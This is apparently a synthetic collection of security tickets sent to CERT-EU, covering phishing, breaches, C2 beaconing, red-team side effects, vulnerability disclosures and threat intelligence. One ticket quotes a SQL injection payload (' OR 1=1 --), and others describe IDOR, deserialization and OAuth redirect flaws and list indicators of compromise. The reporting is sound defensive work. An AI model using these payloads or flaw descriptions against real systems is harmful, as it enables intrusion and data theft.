Over the past 48 hours, our team observed a sharp and unexplained drop in user interactions and engagement metrics on the official 'EU Voices' portal (euvoices.consilium.europa.eu), which serves as a primary channel for citizen feedback on EU initiatives.\n\nInitial checks by our communications staff did not reveal any changes to campaign content or targeting settings that would account for the sudden decline. However, following a tip from our web analytics vendor, our IT staff reviewed the backend logs and noticed several anomalous HTTP POST requests originating from multiple external IPs (e.g., 212.83.140.55, 91.198.174.192). These requests targeted the campaign feedback submission endpoint and included suspiciously crafted payloads with embedded SQL syntax (e.g., ' OR 1=1 --) and user agents mimicking outdated browsers.\n\nOur web application firewall (WAF) flagged several of these requests as potential SQL injection attempts between 19 and 21 June 2024.

While auditing the mobile app 'EuroSecure Connect' (Android v3.7.12, package: eu.euconnect.mobile) for my thesis, I stumbled across a potential insecure direct object reference (IDOR) issue affecting user profile exports. Basically, by intercepting traffic with Burp Suite, I noticed the endpoint /api/v2/profile/export accepts arbitrary user IDs without checking session tokens properly. As a result, I could access profile data (email, org affiliation, photo) of other users, just by swapping the id parameter\u2014see attached screenshots.\n\nThis was tested using test accounts only, not real user data.

The link, which I have defanged here, is hxxps://ecb-digitalid[.]eu-secure[.]org/verify. The message claims this verification is mandatory due to \"new EU-wide digital identity compliance regulations\" and threatens \"limited access to digital services\" if not completed within 48 hours.

The alert was triggered after a routine policy compliance scan detected new global admin assignments to two service accounts (svc_graphapi1, svc_deploybot2) that do NOT normally require such rights. These changes originated from a user session attributed to \"m.petrosyan@ecdc.europa.eu\"\u2014a legitimate admin, but the timing and context look off.\n\nNotable findings:\n- The admin role assignments occurred from an IP address in Vilnius (85.206.123.45), which is not in the usual geo-fence for our cloud admins (typically Stockholm or Brussels).\n- Azure AD sign-in logs show a failed MFA attempt for m.petrosyan about 30 seconds before the successful login.\n- Immediately after, multiple Azure Resource Manager (ARM) deployments were kicked off, including a template referencing a previously unseen storage account (ecdc-logs-temp).\n- Our EDR (Defender for Cloud) flagged an unusual PowerShell execution on the admin\u2019s workstation, launching Connect-AzAccount with the \u2013UseDeviceAuthentication flag\u2014something we rarely see internally.\n\nActions so far:\n- Revoked all active sessions for m.petrosyan and the affected service accounts.\n- Rolled back the suspicious role assignments and temporarily disabled programmatic access to the subscription.\n- Notified our DPO as a precaution\u2014no confirmed data leakage, but we\u2019re still pulling activity logs for exfil signs.\n- Collected full [AzureADSignIns.csv], relevant [activitylog.json], and Defender for Cloud alerts (see attached: ecdc_azure_incident_20240617.zip).\n\nQuestions/Assistance Needed:\n- Can you assist in reviewing whether this was a targeted phishing attempt or token theft?

There were repeated attempts to contact an external domain (hxxp://europeanalytica[.]org/download/klip32.dll) over port 443, which is not a whitelisted research endpoint. The hash for the dropped DLL (SHA256: 51a7c2a3b6a1d4...) doesn\u2019t match anything in our current threat feeds or the VirusTotal DB as of 14:05. Below is a relevant EDR alert excerpt:\n\n[Defender Alert ID: 478393]\nTimestamp: 2024-07-11 13:34:52 CEST\nProcess: rundll32.exe\nUser: user_bartoli\nNetwork: Outbound to 185.244.25.61:443\n\nWe\u2019ve quarantined the affected device and revoked the user\u2019s credentials, but we\u2019re still seeing similar beaconing attempts from two other lab workstations (jrc-labws-11, jrc-labws-22) within the same subnet. This suggests lateral movement, possibly via shared mapped drives. No evidence yet of data exfiltration, but we\u2019re still pulling network logs and traffic captures.\n\nWe\u2019re short-staffed and need CERT-EU\u2019s help with rapid triage, memory forensics, and advice on further containment, especially as these machines have access to sensitive research datasets. I\u2019ve attached the full EDR alert bundle and a pcap sample to this ticket (see \u2018jrc-malware-jul11.zip\u2019).\n\nLet me know if you want the AD logs or additional workstation images.

My team at the University of Pavia\u2019s Department of Computer Engineering recently completed an in-depth analysis of the EuroScience Grant Portal (https://grants.euroscience-platform.eu), specifically its application review module.\n\nDuring a controlled test (no production data accessed or modified), we discovered evidence of an insecure deserialization flaw in the handling of serialized user profile objects within the /api/reviewer/upload endpoint. The endpoint accepts a base64-encoded payload parameter named \"profile_data\" which, after minimal fuzzing, was found to be unserialized directly by the backend Java service without adequate validation or type restriction. Our proof-of-concept payload (details in attached report) demonstrates that arbitrary Java objects can be injected, which could potentially allow a remote attacker to achieve remote code execution or escalate privileges within the application context.\n\nTo clarify, we did not attempt to exploit this beyond the test user account provisioned for the research project. All payloads were designed to confirm deserialization behaviour and did not impact the integrity or confidentiality of real user data. However, the risk associated with this class of vulnerability is significant, especially considering the sensitive nature of applicant information processed by the portal.\n\nKey technical observations:\n- Endpoint: POST https://grants.euroscience-platform.eu/api/reviewer/upload\n- Parameter: profile_data (base64-encoded serialized Java object)\n- No evidence of input validation or class whitelisting prior to deserialization\n- Application appears to use Apache Commons Collections 3.2.1 (vulnerable to known gadget chains)\n\nI have attached a detailed technical write-up (PDF) including the PoC, request/response samples, and recommended mitigation strategies (e.g., implementation of a safe serialization framework or input whitelisting). We are submitting this disclosure in accordance with CERT-EU\u2019s coordinated vulnerability disclosure policy and the European Union Agency for Cybersecurity\u2019s responsible research guidelines.\n\nWe would appreciate feedback regarding the preferred remediation and disclosure timeline, and are happy to collaborate with both CERT-EU and the relevant system maintainers for further validation or mitigation testing.\n\nThank you for your attention to this matter.

As you know, we kicked off the engagement on 8 July, and our IT security team has been monitoring the test activities closely as per our joint protocol (ref: ECA-PT-2024-07).\n\nEarlier today (11 July, approx. 10:25 CET), our SIEM (Splunk Enterprise) generated several high-severity alerts related to anomalous SMB traffic targeting the finance subnet (10.12.34.0/24). Specifically, we observed repeated authentication attempts against the ECA-FIN-APPSRV01 file server using non-existent user accounts (e.g., svc_test01, audit-temp, and backupuser_old). The attempts originated from the test workstation (172.21.8.44), which matches the IP range you provided in the engagement scope document. We also noticed a short spike in CPU utilization on the server and a couple of temporary account lockouts, though no legitimate users were affected.\n\nOur concern is mainly around the timing: the finance team had a scheduled data import running, and a few users reported minor slowdowns accessing shared folders. No data corruption or access errors have been reported, but the team is a bit anxious given the criticality of these systems, especially during the monthly reconciliation process.\n\nCould you please confirm if these authentication attempts and the associated activity are part of your planned lateral movement and password spraying scenarios? If so, would it be possible to coordinate such tests outside of core business hours in the future to minimize operational impact?

This incident was first detected on 10/07/2024 at approximately 14:40 CET by our internal SOC, following alerts from our SIEM (Elastic Stack) regarding anomalous API activity and possible data exfiltration attempts.\n\nSummary of Incident:\n- Over a 90-minute window, we observed an unusual spike in outbound API requests from the service account 'svc_collab_mgr', which is typically restricted to workflow automation tasks. These requests included large volume exports of project task data, user messaging logs, and attached files\u2014far exceeding normal operational patterns.\n- The source IP addresses (primarily 178.62.85.199 and 37.120.156.48) are not associated with our internal VPN or trusted partners. Geolocation suggests Eastern Europe, which is outside our expected user base.\n- SIEM correlation identified multiple failed login attempts against privileged user accounts ('pm_admin', 'sg_projectlead') immediately prior to the API activity, followed by a successful authentication for 'svc_collab_mgr' from the above IPs.\n- Review of [audit.log] and [access.log] (extracts attached) shows API tokens were issued to 'svc_collab_mgr' without a corresponding interactive login event, raising suspicion of token theft or abuse of compromised credentials.\n- No signs of ransomware or destructive actions have been observed so far. However, some sensitive project documents (marked as restricted under our internal data classification policy) were among the files exported.\n\nImmediate Actions Taken:\n- The affected service account and all related API tokens have been revoked as of 16:05 CET.\n- We have temporarily disabled external integrations (e.g., with Office365 and Slack) pending further investigation.\n- Forensic snapshots of the relevant cloud containers and user sessions have been preserved for CERT-EU review.\n- Data Protection and Legal Affairs have been notified to assess potential GDPR/NIS2 notification requirements.\n\nAssistance Requested:\n- We request CERT-EU\u2019s support in forensic analysis to confirm the vector of compromise (credential theft, session hijack, or API vulnerability) and to determine the extent of any data exfiltration.\n- Recommendations for improving API security, including token management and monitoring, would be appreciated.\n- Please advise if you require additional logs, memory dumps, or direct access to the affected cloud environment.\n\nThis incident may have implications for inter-DG project collaboration and could affect ongoing workstreams if sensitive information was accessed by unauthorised parties.

This disclosure is submitted under the Coordinated Vulnerability Disclosure (CVD) policy and in alignment with NIS2 obligations.\n\nWhile integrating a new market trend analysis module into our existing investment analytics platform, we observed that the backend data processing pipeline (hosted at hxxps://analytics-backend[.]eib[.]int) is inadvertently exposing a misconfigured file upload endpoint. Specifically, the endpoint at /api/v2/upload-analytics accepts arbitrary file types without adequate content validation or authentication checks. Our internal testing demonstrated that it is possible to upload files containing embedded scripts or executable code, which are subsequently processed by the analytics engine with elevated privileges. This could potentially allow a remote attacker to achieve code execution within the analytics container, manipulate market trend data, or pivot laterally within the infrastructure.\n\nWe have attached a technical report (see: EIB_Analytics_UploadVuln.pdf) containing proof-of-concept payloads, affected request samples, and a high-level risk analysis. At this stage, no exploitation beyond controlled testing has occurred, and no sensitive data was accessed or modified. Our assessment suggests that this vulnerability could be leveraged for both data integrity attacks and broader compromise, especially if chained with other misconfigurations or exposed credentials.\n\nGiven the criticality of accurate analytics for investment risk management and regulatory reporting, we recommend prioritising a review of the upload endpoint and implementing strict file type validation, authentication, and sandboxing for all user-supplied data. Please advise on preferred timelines for coordinated remediation and public disclosure, as well as any additional information you require from our technical team.\n\nThank you for your attention to this matter.

While the initial hypothesis pointed towards standard resource exhaustion due to peak user activity, our subsequent analysis of server and application logs has revealed a pattern consistent with a distributed denial-of-service (DDoS) campaign leveraging a previously untracked botnet infrastructure.\n\nKey observations:\n- Traffic spikes originate from a geographically diverse set of IPs, with a notable concentration from Eastern Europe and parts of Asia.\n- The malicious requests mimic legitimate user behavior, employing randomized user agents and dynamic request intervals, which initially evaded standard WAF rate-limiting rules.\n- We have identified several C2 endpoints coordinating the attack, with domains registered in the past month (see attached IOC list in CSV format). Example: hxxp://control-panel[.]dnetcloud[.]xyz\n- The botnet appears to be exploiting unsecured IoT devices (primarily consumer routers and cameras) as reflected in the device fingerprinting logs.\n\nOur current mitigation steps include dynamic IP blocking, increased application-layer filtering, and notification to upstream providers.

I\u2019m writing from the Directorate-General for Mobility and Transport (DG MOVE). We\u2019ve noticed a strange incident that\u2019s caused some confusion in our unit, and I wanted to get your expert eyes on it.\n\nYesterday afternoon, several colleagues (including myself) received an email that claimed to be from the 'EU Mobility Conference Secretariat'. The sender\u2019s address was eu-mobility-conference@eumove-events[.]org, which I don\u2019t recognise as any official address (we usually see addresses ending in @ec.europa.eu for anything related to official events).\n\nThe subject line read: \u201cFinal Notice: Confirm Your Attendance for EU Mobility Conference 2024.\u201d The body of the email invited us to click a link to \u2018secure our seat\u2019 for the upcoming event in Brussels. There was a large blue \u2018Confirm Registration\u2019 button linking to hxxps://register-eumove[.]org/attendee (defanged). The email looked professional at first glance\u2014logos, conference branding, and even a generic GDPR disclaimer at the bottom\u2014but some things were off. For example, the greeting just said \u201cDear Colleague\u201d and didn\u2019t include names, and the English was a bit awkward (\u201cPlease ensure your account is verified to participate the event without delay.\u201d).\n\nWhat set off alarm bells was the urgency: it claimed if we didn\u2019t act by 16:00 CET, our spots would be given away. One colleague clicked the button out of curiosity and landed on a page that mimicked the real EU Login portal, but the URL was wrong. It asked for full email credentials (username, password, even a mobile number for \u2018identity verification\u2019). Thankfully, I don\u2019t think anyone submitted any details\u2014we\u2019ve warned the team not to interact further. I managed to save a screenshot of the email and the fake login page, which I\u2019m attaching here. Apologies for not including the full message headers; I can forward those later if you need them (I\u2019m not very technical, so might need some help extracting them from Outlook).\n\nWe haven\u2019t seen any direct account compromise yet, but I\u2019m concerned this might be part of a bigger spear-phishing attempt, since several staff working on the real conference received the message. Could you please advise if this matches any known campaigns, and let us know if you need more info? Also, should we circulate an internal warning to other DGs?\n\nThanks for your help and sorry if this isn\u2019t the right channel (I figured better safe than sorry!).\n\nBest regards,\n\nDaniela Rossi\nPolicy Officer, DG MOVE\nEuropean Commission\n\ndaniela.rossi@ec.europa.eu", "created_date": "2024-10-14T00:00:00", "email_address": "daniela.rossi@ec.europa.eu", "assigned_queue": "DFIR::phishing"}

Apologies for the somewhat messy formatting, I just pasted in their full message for context. \n\nTheir analysts have flagged what looks like a new campaign tied to the actor codenamed \"Nebula Hawk\" (previously tracked for targeting energy sector assets in the Baltics). Over the last 72 hours, they\u2019ve picked up a spike in DNS queries and outbound HTTPS traffic from several municipal networks in southern Finland, all resolving to a fresh set of domains (defanged list below) and a previously unseen ASN (AS208856, registered in Bulgaria as per RIPE lookup). \n\nHere\u2019s the core indicator set they provided:\n- Domains: nebula-update[.]com, hawkrelay[.]org, fin-trace[.]eu\n- IPs: 185.189.59.77, 185.189.59.88\n- SHA256 hash of dropper sample: 1f5e3e87b8c3f6dca8f8f3c0e13a5e74b6e1d20e1f5a8e9c3e4c6e9e7b9a8c1d\n\nNCSC-FI notes that initial infection appears to leverage malicious macros in invoices sent to municipal procurement departments (maldoc attachment named \"invoice-2024-07-02.xlsm\"). The dropper then establishes persistence via a scheduled task (\"NebulaUpdater\") and beacons to the above C2s using a custom User-Agent string: \"Mozilla/5.0 (NebulaHawk)\". Network telemetry shows C2 callbacks every 4 minutes, with payloads encrypted using RC4 (static key, included in their enrichment file\u2014see attached CSV).\n\nThey\u2019re requesting cross-EU visibility: has any other CERT or agency observed related infrastructure, TTPs, or targeting? They also mention a possible overlap with previous \"SkyFalcon\" activity reported in early June, though the payload and C2s differ. The attached enrichment includes their YARA rule for the dropper and MITRE ATT&CK mapping (T1566.001, T1059.005, T1071.001). \n\nWe\u2019ve run a quick sweep on our side (DG Energy, EC) and so far no hits, but I\u2019d appreciate if CERT-EU could circulate the indicators to relevant partners and check for any correlations in your datasets. Also, any insight on the Bulgarian ASN or the actor\u2019s current targeting focus would be helpful. \n\nFull NCSC-FI report and IOC set attached (TLP:AMBER, please treat accordingly).

On the morning of 2 July 2024, multiple analytics tools (including our primary risk assessment and portfolio simulation platforms) experienced simultaneous malfunctions. The issue was initially suspected to be related to routine software updates or compatibility errors; however, subsequent investigation by our internal SOC has raised concerns of a possible targeted cyber campaign.\n\nNotably, our monitoring systems detected a cluster of outbound connections to previously unknown domains (e.g., hxxps://dataconn-eu[.]org, hxxps://analytics-sync[.]net) during the initial period of disruption.

Our review of event logs (see attached: EIA_analytics_anomalies_20240702.csv) shows repeated failed authentication attempts from internal service accounts shortly before the outages.\n\nGiven the timing and the breadth of affected systems, we suspect this may be part of a broader campaign targeting EU financial analytics infrastructure.

Earlier this week, we were notified by several external candidates that, upon uploading their identification documents and security clearance certificates to the Secure Applicant Management System (SAMS), they received unexpected error messages indicating potential data exposure.\n\nPreliminary review suggests the issue may be related to legacy authentication mechanisms in SAMS, which do not align with current NIS2 compliance requirements. Despite recent efforts to update user access controls and patch system vulnerabilities, the alerts persist and candidates have reported visible traces of sensitive information (partial passport numbers and names) in browser autofill suggestions\u2014raising concern about possible data leakage.\n\nWe have temporarily suspended document uploads and advised candidates to refrain from further submissions until the issue is resolved. In line with GDPR obligations and internal incident response policy, we kindly request CERT-EU\u2019s assistance in investigating the incident, assessing the potential exposure scope, and providing guidance on next steps to secure the recruitment workflow.

We\u2019ve been working with a new training provider, SecureSkills GmbH, who\u2019s supposed to deliver a half-day session for ECB staff and selected colleagues from other EU institutions next month.\n\nHere\u2019s the snag: when we tried to process their onboarding through the ECB\u2019s Supplier Management Portal (SMP), their representative (Ms. Julia Weiss) reported persistent errors during the digital signature step of the EU-wide vendor compliance form. The system either times out or returns a vague \u2018validation error\u2019 message. She\u2019s tried from different browsers and networks, but no luck. Our IT helpdesk checked and said there\u2019s no current SMP outage, but this seems to be affecting at least two external vendors this week, both in the context of HR-led training events.\n\nI\u2019ve attached a screenshot (see: SMP_vendor_error_20240611.png) and the completed compliance form in PDF, as Ms. Weiss sent it directly to us after multiple failed portal attempts.

These connections originated from workstations running the E-RegData Suite (v5.2.1), which is not supposed to initiate any anonymized traffic by design.\n\nInitial review of Suricata logs revealed multiple HTTP POST requests to hxxp://datacore-gateway[.]org, always following a pattern: the POST body contains what looks like RC4-encrypted blobs, 1024 bytes each, with a recurring header (hex: 0x7E4A3C). No legitimate process is known to use this protocol. We checked the hashes of the involved binaries (primary: 3e7f1d5cdb...b6f2, secondary DLL: 9f4c0e2a...c8b1) and got no hits on VirusTotal or our internal MISP instance.\n\nWe also noticed scheduled tasks (Task Scheduler entry: \"SysUpdate-Check-8am\") spawning PowerShell processes with obfuscated command lines, which subsequently reach out to the above Tor nodes. MITRE ATT&CK mapping suggests T1090.003 (Proxy: Multi-hop Proxy) and T1059.001 (Command and Scripting Interpreter: PowerShell). The activity started after a failed update attempt of the E-RegData Suite, possibly indicating a supply chain vector, but we have not confirmed this yet.\n\nNo exfiltration of sensitive market data has been confirmed, but the persistence and sophistication of the C2 channel is concerning, especially given the criticality of the affected department. We have blocked all Tor traffic at the firewall and are conducting a wider sweep for similar activity across other directorates.\n\nRequesting CTI support for:\n- Enrichment of the attached Tor exit node list (CSV, TLP:AMBER)\n- Any intelligence on recent campaigns leveraging Tor-based C2 against EU regulatory bodies\n- Actor profiling if you have seen similar RC4-encrypted C2 patterns or the datacore-gateway[.]org domain\n\nPlease let us know if you require memory dumps or further endpoint artefacts.

I\u2019m not a technical expert, but I wanted to flag this as soon as possible, since it looks like the simulated adversary activities might be triggering some unexpected behavior in our Azure AD logs.\n\nSpecifically, between 03:00 and 05:00 this morning, we received multiple alerts about failed logins from test accounts (those prefixed with \u201crt-sim\u201d) trying to access the \u201ccollab-portal.europa.eu\u201d SharePoint instance. The IPs logged (145.56.29.187 and 145.56.29.199) match the ones your team provided in the engagement scope, so I\u2019m assuming these are part of the planned lateral movement tests. However, we also saw two separate spikes in conditional access policy denials, which locked out a couple of non-test accounts (julia.b, and t.keller) for about 15 minutes each. Both users reported being unable to access their OneDrive folders and Teams channels during that window, which obviously caused some confusion.\n\nI\u2019ve attached the relevant log extracts (see: AzureAD_AuthEvents_20240703.csv) and a screenshot of the user complaints from our internal helpdesk tool. Can you confirm whether these lockouts were an intended part of the simulation, or if we need to adjust our policies to avoid collateral impact on regular staff? Our IT support is fielding a few tickets already and would like to avoid further disruption if possible.\n\nAlso, please advise if there are any specific hours we should expect more aggressive activity so we can coordinate with the business units. The original schedule mentioned testing between 02:00\u201306:00 CET, but some of these alerts came in slightly outside that window.\n\nSorry if this isn\u2019t the most technical summary, but let me know if you need anything else from our side.

Our analysts have been monitoring several invite-only forums on both Tor and I2P, and we've noticed a marked uptick in discussions around a new marketplace, \"MercuryBazar,\" which appears to be facilitating the sale of initial access credentials for various EU public sector networks. The actors involved are referencing access to Citrix and VMware Horizon environments, specifically mentioning \"EU-regional procurement portals\" and \"municipal data exchange nodes\"\u2014though no explicit institution names are listed.\n\nWe were able to obtain a sample listing (see attached screenshot and redacted forum transcript), which advertises RDP access to a \"LuxGov\"-tagged endpoint, along with a zipped CSV containing a handful of credential pairs (not included here for legal reasons, but we can coordinate secure transfer if required). Sellers are accepting Monero only, and their OPSEC is above average\u2014PGP is mandatory for all communications, and the forum moderators actively scrub any direct links or file hashes.\n\nOur initial review found that the TTPs described (use of stealer logs, brute-forced VPN accounts, and lateral movement via SMB shares) overlap with those seen in the \"IronClad\" access broker group, though attribution remains low-confidence at this stage. No confirmed breaches reported yet, but we recommend raising awareness with your constituency, especially for organizations running externally exposed Citrix or Horizon instances.\n\nLet us know if you need further details or would like to coordinate on deeper infiltration of this marketplace.

During a scheduled user onboarding session last week, we observed that certain access controls within the dashboard\u2019s layout configuration can be bypassed, allowing standard users to modify widgets and visibility settings intended solely for administrative roles.\n\nThe issue arises when a user manipulates specific parameters in the dashboard\u2019s layout API requests (notably, the 'role' and 'widget_id' fields). This enables them to reorder, hide, or expose tools that should be restricted, potentially resulting in accidental data exposure or workflow disruptions.

On 27 June 2024, our team at the European University Data Science Centre observed anomalous query patterns targeting our central MySQL database cluster (host: db-tensor.intra.university.eu). These queries originated from an internal service account (svc_tensorflow) used by a TensorFlow-based analytics pipeline, which is not typically authorised to access sensitive datasets containing personal and research grant information.\n\nThe anomaly was initially detected via our SIEM (Elastic Stack), which flagged an unusually high volume of SELECT and DUMP commands issued by svc_tensorflow between 03:20 and 04:05 CET. Further investigation revealed the account had accessed several tables outside its standard scope, including those with GDPR-protected records. Our review of [mysql_general.log] (see attached extract) shows the following example query:\n\n2024-06-27 03:36:12 | svc_tensorflow | SELECT * FROM eu_grant_applicants WHERE nationality = 'DE';\n\nAdditionally, outbound network monitoring registered encrypted data transfers from host analytics-tf01.university.eu to an external IP (194.187.249.18), which is not whitelisted for institutional use. At this time, it is unclear whether this activity is the result of a misconfiguration or a compromised service account.\n\nImmediate actions taken:\n- Disabled svc_tensorflow credentials and halted all TensorFlow-MySQL integrations pending further review\n- Isolated analytics-tf01.university.eu from the campus network\n- Preserved relevant database and network logs for forensic analysis\n\nWe request CERT-EU's assistance in determining the nature and scope of this potential breach, and in advising on containment and notification obligations under GDPR and NIS2. Please advise if you require additional artifacts or system images for analysis.\n\nThank you for your attention to this matter.

Over the past 48 hours, our honeypots have flagged a spike in inbound traffic on TCP/45777 and UDP/29900 from a diverse set of global IPs, mostly in the Asia-Pacific region. The pattern doesn\u2019t match previous Mirai or Mozi botnet activity we\u2019ve tracked in the past quarter.\n\nOur automated analysis pipeline (Elastic SIEM + Zeek) extracted several unique payloads. One sample (SHA256: 2b1c9fdb...a2e34) appears to be a custom ELF binary with embedded domain generation algorithm (DGA) logic, generating pseudo-random subdomains under \"connect-hub[.]io\" and \"fastmesh[.]cc\". Reverse engineering shows the binary attempts to beacon every 37 minutes and includes an unusual XOR-based config encryption. No clear overlap with known IoCs in our MISP instance as of this morning.\n\nNotably, two Lithuanian public sector endpoints (Ministry of Social Security and Labour, and a Vilnius university research cluster) initiated outbound connections to the above domains. We\u2019re still determining initial infection vectors, but the endpoints had RDP and SMB open to the public internet, which could be related.\n\nPlease see attached CSV (TLP:AMBER) with observed C2 IPs (defanged), DGA subdomain patterns, and relevant network artifacts. We\u2019re hoping CERT-EU can:\n- Cross-reference these indicators with any recent botnet infrastructure takedown efforts or emerging C2 clusters across EU institutions\n- Share any TTP overlaps with active campaigns or actor profiles (MITRE ATT&CK T1071.001 \u2013 Application Layer Protocol: Web Protocols, T1095 \u2013 Non-Application Layer Protocol)\n- Advise on possible attribution or mitigation steps for affected public sector assets\n\nSorry for the rushed note, it\u2019s been a long night shift.

Yesterday (12 July 2024), around 18:35 CEST, our Zabbix monitoring flagged a significant outbound traffic spike from node rc-07a.jrc.it (part of the Joint Research Centre\u2019s bioinformatics group), which is unexpected at that hour and volume. The NOC alerted us to over 12GB of data sent to an external address (193.34.21.114), which isn't whitelisted and has no prior connection to our environment.\n\nInitial investigation by our sysadmin found these entries in the pfSense firewall logs:\n\n[2024-07-12 18:35:08] ALLOW OUT: rc-07a.jrc.it \u2192 193.34.21.114:443 (TLS)\n[2024-07-12 18:36:10] ALLOW OUT: rc-07a.jrc.it \u2192 193.34.21.114:443 (TLS)\n[2024-07-12 18:39:45] ALLOW OUT: rc-07a.jrc.it \u2192 193.34.21.114:443 (TLS)\n\nWe double-checked the cluster jobs running at that time. No user-initiated tasks match the transfer size, and SLURM job logs show only routine data crunching, not exports. Further, Splunk records show a suspicious process tree: '/usr/bin/python3' launched by 'slurm' user, executing a script ('bio_extract_20240712.py') not present in our git repo or job submissions. The script was wiped from /tmp within minutes after the transfer.\n\nNo antivirus or EDR (we use SentinelOne) flagged the file or process, but the timing and lack of known workflow suggest possible compromise or insider misuse. We have preserved a memory dump and are locking down SSH access to the affected node. For context, rc-07a handles large, non-classified datasets, but the destination IP appears linked to a VPS provider in Moldova per our threat intel feeds.\n\nWe\u2019re escalating as a potential data exfiltration incident.

As part of our ongoing review of third-party integrations and their associated security posture, we examined the OAuth2-based authentication workflow currently implemented for Xero connections.\n\nDuring this process, we identified that the integration endpoint (hxxps://api.saas-project.eu/integrations/xero/callback) does not sufficiently validate the 'redirect_uri' parameter. This could potentially allow an attacker to manipulate the OAuth flow and capture authentication tokens by supplying a crafted redirect URI, thereby gaining unauthorised access to sensitive financial data within connected Xero accounts. Our preliminary tests indicate that the endpoint does not enforce a strict allowlist of permitted redirect URIs, which is contrary to best practices outlined in the ENISA guidelines and may introduce a risk of account compromise.\n\nWe have attached a technical report detailing our test cases, HTTP request samples, and suggested mitigation strategies.

Hoping you might be able to help us with some context or cross-correlation.\n\nAround 03:25 CEST, our NetFlow monitoring flagged persistent outbound connections from three different campus endpoints (all in the 147.251.42.x subnet) to a cluster of external IPs in the 102.219.144.0/26 range. These connections were all over TCP/8082 and exhibited beaconing intervals (every 8 minutes, quite regular). We double-checked: none of the endpoints are running any scheduled data syncs at that hour, and all belong to lab machines in the Faculty of Informatics. No recent software changes or maintenance logged.\n\nWe ran a quick sweep with Zeek and found small encrypted payloads in the outbound streams, but nothing conclusive. None of the target IPs show up in our current threat feeds (abuse.ch, Shadowserver, or the EU MISP community). VirusTotal is quiet too. The behaviour looks suspiciously like C2 activity, possibly early-stage botnet recruitment or a test run?\n\nFor reference, I\u2019ve attached a PCAP extract (sanitised, TLP:GREEN) and a CSV with connection metadata. At this point, we haven\u2019t observed any lateral movement or privilege escalation on our side, but we\u2019re holding off reimaging the endpoints until we know more. Have you seen similar activity or any chatter about new botnet C2 infrastructure leveraging this IP range or TCP/8082 recently?\n\nWould appreciate any quick insights\u2014especially if this overlaps with ongoing botnet tracking or known actor campaigns. Let me know if you want the full host images or deeper logs.\n\nSorry for the rambling, it\u2019s been a long night.

We\u2019ve come across some weird activity tied to what looks like a resurgent Cobalt Crane actor set, and I figured this should go straight to CTI. Our NOC flagged a sudden uptick in SSH brute force attempts coming from a rotating pool of IPs (mostly in the 102.219.x.x and 45.146.x.x ranges), hitting a handful of legacy maintenance servers exposed for remote diagnostics. The attempts themselves weren\u2019t super sophisticated, but when we correlated logs with our SIEM (Splunk, using custom threat feeds), several of the source IPs and domains (see attached ioc_nmbs_crane_20240628.csv) showed up in last month\u2019s CIRCL-LU threat bulletin on Cobalt Crane\u2019s new C2 nodes.\n\nWe\u2019ve attached a full export of the observed indicators, including:\n- 17 source IPs (geolocated to Bulgaria, South Africa, and Singapore)\n- 4 domains registered via NameSilo in May 2024, e.g. railgate-support[.]com, techmaint-remote[.]info\n- 2 SSH key fingerprints we haven\u2019t seen before (details in CSV)\n\nOur internal review also flagged outbound DNS queries to update-railnet[.]com and suspicious traffic over TCP/8080, both of which triggered Suricata rules for Cobalt Crane\u2019s beaconing pattern (MITRE ATT&CK T1071.001, T1133). No evidence yet of successful compromise, but the pattern matches the actor\u2019s recent pivot to targeting transport sector infrastructure in Central Europe.\n\nWe\u2019d appreciate if you could:\n- Check for any recent cross-institution hits on the attached IOCs, especially against Cobalt Crane-linked clusters\n- Advise on any new TTPs or C2 infrastructure seen in your datasets since the May bulletin\n- Let us know if there\u2019s chatter about a new campaign targeting railway OT/IT bridges, as our OT monitoring flagged an uptick in anomalous Modbus queries (see logs in the zip)\n\nThis isn\u2019t a red alert yet, but given the past impact of Cobalt Crane in the region, we want to be ahead of it.

The script attempted to establish an outbound connection to hxxps://api[.]datastream-bridge[.]net (unknown to our whitelist) and subsequently downloaded a secondary payload (SHA256: 3a8f7d...c91e).\n\nInitial review of [Sysmon] and [Windows Event Logs] shows the script leveraging elevated privileges, possibly through token impersonation. We also observed the creation of a new local admin account ('svc_update') not present in our baseline, and a set of scheduled tasks designed to persist across reboots. No immediate signs of data exfiltration, but given the server's access to sensitive investment models and decision support datasets, we are concerned about the potential for lateral movement or further compromise.\n\nActions taken so far:\n- Isolated the affected server from the internal network.\n- Disabled the suspicious accounts and revoked all recent privilege escalations.\n- Collected relevant forensic artefacts (see attached: [invest-analytics01_events.evtx], [edr_alert.json]).\n\nWe are requesting urgent assistance with in-depth forensic analysis, recommendations for containment, and any advice regarding NIS2 notification obligations. Please advise if you require additional artefacts or remote access for triage.\n\nThank you for your prompt support.\n\nBest regards,\n\nAnja Kov\u00e1cs\nSOC Analyst\nEuropean Investment Bank", "created_date": "2024-12-06", "email_address": "anja.kovacs@eib.europa.eu", "assigned_queue": "DFIR::incidents", "original_queue": "IT Support"}

I\u2019ve reviewed the guidance circulated last month, but a few of the steps seem a bit unclear from a participant perspective, especially for external partners like myself who don\u2019t have direct access to the internal finance portal.\n\nSpecifically, I have a few questions about the submission process:\n\n1. The original instructions mentioned that receipts should be consolidated into a single PDF and uploaded via the StaffNet portal. As a visiting researcher from the University of Ljubljana, I do not have StaffNet credentials\u2014should I instead send the documents directly to the admin@cert.europa.eu address, or is there an alternative secure method (e.g., via the EU FileX system)?\n\n2. Regarding accommodation, the invoice I received from the Park Inn lists both my room and a shared conference space rental. Will the finance office require a breakdown, or is the full invoice acceptable for reimbursement purposes? I can request a revised invoice from the hotel if necessary, but this may take a few extra days.\n\n3. The guidance also references a \u2018Reimbursement Form 2024\u2019. I was unable to locate this form on the public CERT-EU website. Could you please forward the latest version or let me know where to download it? I want to ensure I submit everything in the correct format to avoid delays.\n\nLastly, please confirm if digital signatures are acceptable on the form, or if a scanned, hand-signed copy is required. My university\u2019s admin office prefers digital-only processing for cross-border paperwork, but I\u2019ll adapt as needed.\n\nSorry if these are basic questions\u2014just want to make sure everything\u2019s in order before the submission deadline next Friday.

